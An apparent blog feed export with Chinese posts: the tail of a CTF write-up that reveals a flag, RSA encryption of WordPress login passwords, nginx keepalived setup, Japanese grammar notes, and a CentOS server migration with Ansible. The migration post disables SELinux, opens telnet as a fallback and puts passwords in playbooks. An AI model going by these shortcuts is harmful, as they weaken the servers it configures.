srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>构造 GetYourFlag调用GetYouFlag()<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1414.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1414.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1416.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1416.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>OK，接下来<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1426.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1426.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>最后发现flag{3904c5df2e894ca02a21004feb21e617} 在源码中。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1479.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1479.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress后台登录密码前端js加密+php后端解密</title>
      <link href="2019/08/26/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/"/>
      <url>2019/08/26/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>由于特殊原因，wordpress后台登录密码不能被明文抓包…<br>于是我采用 rsa 前端 js 加密 + php 后端解密 的方式进行</p><p>那只能大费周章去改wordpress代码了= = 。。。。</p><p>由于 wordpress 登录时 wp-login.php 是直接提交表单给自己的<br>于是想到用 jquery 去修改表单数据， 直接上代码。</p><h4 id="wordpress根目录-wp-login-php-文件"><a href="#wordpress根目录-wp-login-php-文件" class="headerlink" title="wordpress根目录 wp-login.php 文件"></a>wordpress根目录 wp-login.php 文件</h4><p>此处需要用到两个库文件 <a href="https://code.jquery.com/jquery-3.4.1.min.js">jQuery</a> 和 <a href="https://github.com/travist/jsencrypt">jsencrypt</a><br>在表单代码后面的 js 处 添加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./wp-includes/js/jquery/jquery-3.4.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./wp-includes/js/jsencrypt.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">/*</span><br><span class="line"> * writeBy：TARI</span><br><span class="line"> * date: 2019/08/26</span><br><span class="line"><span class="javascript"> * usage: $(<span class="string">&quot;#user_pass&quot;</span>).change方法对密码进行 rsa 公钥加密传输</span></span><br><span class="line">*/</span><br><span class="line"><span class="javascript">$(<span class="string">&quot;#user_pass&quot;</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//失去焦点触发，就是点击登陆按钮后触发</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// 数据处理</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pubkey = <span class="string">&#x27;你的公钥&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span></span><br><span class="line">encrypt.setPublicKey(pubkey);</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> encrypted = encrypt.encrypt($(<span class="string">&#x27;#user_pass&#x27;</span>).val())</span></span><br><span class="line"><span class="javascript"> $(<span class="string">&quot;#user_pass&quot;</span>).val(encrypted);<span class="comment">//重新赋值</span></span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="comment">&lt;!-- 下面还有wp_attempt_focus()等函数， 或者新建一对 js 标签也行，不过我没测试过 --&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="wordpress根目录-wp-includes-pluggable-php-文件"><a href="#wordpress根目录-wp-includes-pluggable-php-文件" class="headerlink" title="wordpress根目录/wp-includes/pluggable.php 文件"></a>wordpress根目录/wp-includes/pluggable.php 文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = sanitize_user(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = trim(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里后添加如下代码：</span></span><br><span class="line"><span class="comment">// 私钥不能因为好看而添加乱七八糟的缩减之类的</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&quot;私钥内容&quot;</span>;</span><br><span class="line"><span class="variable">$decrypt_data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// 判断私钥是否是可用的，可用返回资源id</span></span><br><span class="line"><span class="variable">$pi_key</span> =  openssl_pkey_get_private(<span class="variable">$private_key</span>);</span><br><span class="line"><span class="comment">// 解密数据, 这里要进行 base64 解码是因为浏览器会默认帮你的数据进行编码</span></span><br><span class="line">openssl_private_decrypt(base64_decode(<span class="variable">$password</span>), <span class="variable">$decrypt_data</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$decrypt_data</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面一堆代码 balabala</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再抓包密码就是加密状态啦！<br>在 wordpress 找密码验证的函数和文件找了挺久的….</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx双冗余及负载均衡搭建</title>
      <link href="2019/07/28/Redundancy%20and%20load%20balancing/"/>
      <url>2019/07/28/Redundancy%20and%20load%20balancing/</url>
      
        <content type="html"><![CDATA[<h3 id="nginx-双冗余"><a href="#nginx-双冗余" class="headerlink" title="nginx 双冗余"></a>nginx 双冗余</h3><p><a href="https://github.com/TARI0510/webAnsible/tree/master/roles/keepalived">nginx 冗余安装脚本链接</a><br>配置文件的 <a href="#">链接在此</a></p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="**注意事项**"></a>**注意事项**</h4><ul><li><p>/etc/selinux/config<br>SELINUX=off</p></li><li><p>感觉线上和线下一个比较大的区别就在防火墙，线下可以的在被这个卡了半天</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0 该字段根据网卡类型来定义</span></span><br><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li><li><p>这个ip转发用不用就忘了测试了，如果开启防火墙还不行就试试吧。<br>echo “net.ipv4.ip_forward = 1” &gt;&gt; /etc/sysctl.conf</p></li></ul><ul><li><p>如果没装 zlib zlib-devel openssl 的记得安装喔！</p></li><li><p>*** WARNING - this build will not support IPVS with IPv6. Please install libnl/libnl-3 dev libraries to support IPv6 with IPVS.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install libnl libnl-devel</span><br></pre></td></tr></table></figure></li></ul><h3 id="nginx-负载均衡"><a href="#nginx-负载均衡" class="headerlink" title="nginx 负载均衡"></a>nginx 负载均衡</h3><p>nginx 配置文件内</p><pre><code>upstream yourname &#123;    yourip;&#125;location / &#123;    proxy_pass http://yourname;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「量詞」</title>
      <link href="2019/07/23/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/"/>
      <url>2019/07/23/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<ul><li><table><thead><tr><th align="center">-</th><th align="center">–&gt;</th><th align="center">–&gt;</th><th align="center">-</th></tr></thead><tbody><tr><td align="center">１ いち</td><td align="center">か　さ　た　は　行</td><td align="center">いっ</td><td align="center">枚、回、台、歳</td></tr><tr><td align="center">６ ろく</td><td align="center">か　さ　た　は　行</td><td align="center">ろっ</td><td align="center">枚、回、台、歳</td></tr><tr><td align="center">８ はち</td><td align="center">か　　　　　は　行</td><td align="center">はっ</td><td align="center">枚、回、台、歳</td></tr><tr><td align="center">１０ じゅう</td><td align="center">か　さ　た　は　行</td><td align="center">じゅっ</td><td align="center">枚、回、台、歳</td></tr></tbody></table></li></ul><p>例：リンゴを<u>三つ</u>買いました<br>&emsp;&emsp;写真を<u>3枚</u>撮りました<br>&emsp;&emsp;蜜柑を<u>８つ</u>食べました</p><ul><li><p>昨日は4時間<u>しか</u>寝<u>ません</u>でした<br>しか + ませんでした　要翻訳成肯定</p></li><li><p>[量詞] + も　強調 [重 厚 長 大 多]<br>ケーキを8個<u>も</u>食べました</p></li><li><p>[量詞] + しか　強調 [軽 薄 短 小 少]<br>財布に１０元<u>しか</u>あり<u>ません</u></p></li><li><p>[量詞]　だけ zhiyou~ 10分<u>だけ</u>休みましょう</p></li><li><p>[量詞]　ぐらい ~左右　財布に１０元<u>ぐ(く)らい</u>あります</p></li><li><p>[量詞]　は zhishao~ 財布に１０００元<u>は</u>あります</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 勉強 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勉強 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web站群从Ubuntu14.04迁移至CentOS7</title>
      <link href="2019/07/15/ansible-shell/"/>
      <url>2019/07/15/ansible-shell/</url>
      
        <content type="html"><![CDATA[<p><a href="#nfs">nfs迁移</a></p><h3 id="系统环境-CentOS-7-x86-64-Minimal-1511"><a href="#系统环境-CentOS-7-x86-64-Minimal-1511" class="headerlink" title="系统环境: CentOS-7-x86_64-Minimal-1511"></a>系统环境: CentOS-7-x86_64-Minimal-1511</h3><p>相关的剧本和脚本可以 <a href="https://github.com/TARI0510/ansible">参考我的github</a></p><p><a href="https://github.com/TARI0510/webAnsible/tree/master/mysh/common.sh">common.sh 为公用脚本，包含公用模块</a></p><h3 id="服务器备份"><a href="#服务器备份" class="headerlink" title="服务器备份"></a>服务器备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook srvs_backup_role.yml</span><br></pre></td></tr></table></figure><p>出现问题: </p><pre><code>failed: [192.168.206.132] (item=baseVersionBackup.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;fe2fab79a66b8f5489418fd7b556cdbb74abcac6&quot;, &quot;item&quot;: &quot;baseVersionBackup.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125;failed: [192.168.206.132] (item=common.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;b8554aa38d74846821d3575eaf72854f2eb40338&quot;, &quot;item&quot;: &quot;common.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125;</code></pre><p>这个问题主要是由 SELinux（Security-Enhanced Linux）引起的.  CentOS7 一般自带 libselinux-python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有的话可以安装一下</span></span><br><span class="line">yum -y install libselinux-python</span><br></pre></td></tr></table></figure><p>由于我不大了解它, 干脆就把它的禁用了, 记得在目标主机禁用喔..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&#x27;</span> /etc/selinux/config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^SELINUX/s/SELINUX=permissive/SELINUX=disabled/&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure><h3 id="更新源为阿里云源"><a href="#更新源为阿里云源" class="headerlink" title="更新源为阿里云源"></a>更新源为阿里云源</h3><p>这个过程可能要下载的东西较多，有些主机可能写到大半就连接超时了。<br>对于少许主机可以直连上去执行 yum update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook  yum_aliyun_source_role.yml</span><br></pre></td></tr></table></figure><h3 id="openssh-安装"><a href="#openssh-安装" class="headerlink" title="openssh 安装"></a>openssh 安装</h3><h4 id="启用-telnet-以防万一"><a href="#启用-telnet-以防万一" class="headerlink" title="启用 telnet 以防万一"></a>启用 telnet 以防万一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&#x27;yum -y install xinetd telnet-server&#x27;</span></span><br><span class="line">ansible webGroup -m shell -a <span class="string">&#x27;ls -ll /etc/xinetd.d/telnet&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="添加用户以防万一"><a href="#添加用户以防万一" class="headerlink" title="添加用户以防万一"></a>添加用户以防万一</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">webGroup</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">name=username</span> <span class="string">password=yourpassword</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> &#123;&#123; <span class="string">runHost</span> &#125;&#125;</span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">group</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">name=username</span> <span class="string">state=absent</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">name=username</span> <span class="string">state=absent</span></span><br></pre></td></tr></table></figure><p>关闭防火墙，让外边的 telnet 请求可以进来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service=telnet --permanent</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 23 -jACCEPT</span><br><span class="line">iptables -I INPUT -p udp --dport 23 -jACCEPT</span><br><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h4 id="准备工作完成，开始安装-OpenSSH"><a href="#准备工作完成，开始安装-OpenSSH" class="headerlink" title="准备工作完成，开始安装 OpenSSH"></a>准备工作完成，开始安装 OpenSSH</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook openssh_role.yml</span><br></pre></td></tr></table></figure><p>确认是否升级成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&quot;ssh -V&quot;</span></span><br></pre></td></tr></table></figure><p>重启一下主机，等待少许时间并检测 sshd 的状态，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&quot;reboot&quot;</span></span><br><span class="line"></span><br><span class="line">ansible webGroup -m shell -a <span class="string">&quot;systemctl status sshd&quot;</span></span><br></pre></td></tr></table></figure><p>对于有问题的少许主机可以直连上去执行 systemctl stop sshd 并等待少许执行<br>systemctl start sshd</p><p>开启防火墙，阻止外边的 telnet 请求进来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --remove-service=telnet</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 23 -jDROP</span><br></pre></td></tr></table></figure><h3 id="对相应的服务器安装-nginx-1-16-0"><a href="#对相应的服务器安装-nginx-1-16-0" class="headerlink" title="对相应的服务器安装 nginx 1.16.0"></a>对相应的服务器安装 nginx 1.16.0</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook nginx_role.yml</span><br></pre></td></tr></table></figure><p>nginx的配置根据旧服务器的来就好了.</p><h4 id="nginx-双冗余"><a href="#nginx-双冗余" class="headerlink" title="nginx 双冗余"></a>nginx 双冗余</h4><p><a href="https://github.com/TARI0510/webAnsible/tree/master/roles/keepalived">nginx 存活探测脚本链接</a><br>配置文件的 <a href="#">链接在此</a><br>/<em>/<em>注意事项/</em>/</em></p><p>脚本要用到 killall 命令, 没有的同学记得装, centos killall的包是，不过我的脚本会默认帮你装上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install psmisc</span><br></pre></td></tr></table></figure><p>防火墙的的网卡 eth0 记得跟根据自己的网卡来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h4 id="nginx-负载均衡"><a href="#nginx-负载均衡" class="headerlink" title="nginx 负载均衡"></a>nginx 负载均衡</h4><p>这个比较容易, 需要注意的是如果用到 session 记得用 哈希法 即添加</p><pre><code>ip_hash; </code></pre><p>到 upsteam 中就好啦</p><h3 id="对相应的服务器安装-PHP7-2"><a href="#对相应的服务器安装-PHP7-2" class="headerlink" title="对相应的服务器安装 PHP7.2"></a>对相应的服务器安装 PHP7.2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook php_role.yml</span><br></pre></td></tr></table></figure><p>根据网上资料推荐使用 sock 而且不是 端口cgi 模式<br>php旧服务器的配置更换了 /etc/php.ini 和 /etc/php-fpm.d/<a href="http://www.conf/">www.conf</a> 文件到新服务中</p><h3 id="对相应的服务器安装-mysql5-7"><a href="#对相应的服务器安装-mysql5-7" class="headerlink" title="对相应的服务器安装 mysql5.7"></a>对相应的服务器安装 mysql5.7</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook mysql_role.yml</span><br></pre></td></tr></table></figure><p>安装完后记得对导入的数据授权喔！！！不然远程连接会被禁止掉的。</p><h3 id="为了方便知道自己操控哪个服务器"><a href="#为了方便知道自己操控哪个服务器" class="headerlink" title="为了方便知道自己操控哪个服务器"></a>为了方便知道自己操控哪个服务器</h3><p>在 /etc/bashrc 或 ~/.bashrc 文件最后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PS1=<span class="string">&quot;[\u@`hostname -I | cut -d &quot;</span>.<span class="string">&quot; -f 4`\W]# &quot;</span></span><br></pre></td></tr></table></figure><p>然后 source 一下</p><h3 id="调整时间、时区"><a href="#调整时间、时区" class="headerlink" title="调整时间、时区"></a>调整时间、时区</h3><p>由于我的时间和北京时间是一样的, 所以我就省略这步啦!</p><h3 id="nfs-服务器的迁移"><a href="#nfs-服务器的迁移" class="headerlink" title="nfs 服务器的迁移"></a><span id="nfs">nfs 服务器的迁移</span></h3><p><a href="https://github.com/TARI0510/webAnsible/tree/master/mysh">common.sh 和 nfs.sh 脚本位置</a><br>首先配置要使用 nfs 服务的服务器路径</p><pre><code># /etc/exports 文件/home/www/某个站点 ip地址(rw,sync,all_squash,no_subtree_check)/home/www/某个站点 IP地址(rw,sync,all_squash,no_subtree_check)</code></pre><p>/home 路径是下图 mounted on 下的路径<br><img src="/img/Linux_Server_Maintenance/nfs_notice.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/nfs_notice.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="notice"></p><p>参数说明:</p><ul><li>rw 读写权限</li><li>sync 数据同步写入内存缓冲区和硬盘, 保证数据一致</li><li>all_squash 所有访问用户都映射为匿名用户或用户组</li><li>no_subtree_check 即使输出目录是一个子目录，nfs服务器也不检查其父目录的权限</li></ul><p>把文件传送到目标服务器balabala～</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload nfs</span><br></pre></td></tr></table></figure><p>允许相应服务的防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service=nfs --permanent --zone=public</span><br><span class="line">firewall-cmd --add-service=mountd --permanent --zone=public</span><br><span class="line">firewall-cmd --add-service=rpc-bind --permanent --zone=public</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>创建相应文件的软连接方便nfs上nginx的使用<br>在web服务器上创建要挂载的文件夹并挂载</p><p>临时挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs nfs的IP地址:路径 本机路径</span><br></pre></td></tr></table></figure><p>/etc/fstab 文件添加以用于开机启动</p><pre><code>nfs的ip地址:路径  本机路径 nfs rw  0 0nfs的ip地址:路径   本机路径 nfs rw  0 0需要主要，两台不同服务器的用户的gid和uid一不一致，不然会出现旧服务器无法写入的现象</code></pre><h3 id="rsync-增量备份"><a href="#rsync-增量备份" class="headerlink" title="rsync 增量备份"></a>rsync 增量备份</h3><p>小前言: 权限明明够，但是一直报这个错：</p><pre><code>rsync: recv_generator: mkdir &quot;test&quot; (in home_131) failed: Permission denied (13)</code></pre><p>后来发现 selinux 没关闭。。。。。。。。。。。。</p><h4 id="首先开放端口吧！"><a href="#首先开放端口吧！" class="headerlink" title="首先开放端口吧！"></a>首先开放端口吧！</h4><p>如果用的是 iptables </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc/sysconfig/iptables </span><br></pre></td></tr></table></figure><p>添加</p><pre><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT</code></pre><p>或者直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT</span><br></pre></td></tr></table></figure><p>然后再重启一下就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart iptables</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save</span><br></pre></td></tr></table></figure><p>如果用的是 firewalld</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=873/tcp --permanent &amp;&amp;</span><br><span class="line">firewall-cmd --reload &amp;&amp;</span><br><span class="line">firewall-cmd --list-port</span><br></pre></td></tr></table></figure><p>我搭建的 rsync 是这样子的，主服务器 (也就是正在运行Web服务器的服务器) 文件发生改变 (内容改变或者文件本身的增加或者删除) 就会通过监听脚本自动备份到备份服务器</p><p>以下安装和配置 rsync 是参考该链接 <a 